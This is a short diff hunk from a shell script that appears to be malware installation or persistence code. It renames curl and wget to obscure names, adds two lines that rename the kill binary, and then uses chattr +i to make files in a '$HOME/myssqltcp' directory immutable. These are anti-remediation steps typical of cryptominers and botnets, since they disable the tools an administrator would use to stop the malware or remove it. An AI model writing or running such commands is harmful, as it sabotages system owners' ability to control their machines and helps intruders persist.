@@ -96,6 +96,8 @@ mv /usr/bin/curl /usr/bin/url
 mv /usr/bin/url /usr/bin/lruc
 mv /usr/bin/wget /usr/bin/get
 mv /usr/bin/get /usr/bin/tegw
+mv /usr/bin/kill /usr/bin/klii
+mv /usr/bin/klii /usr/bin/klili
 
 echo "[*] Yes-Go"
 chattr +i $HOME/myssqltcp/*
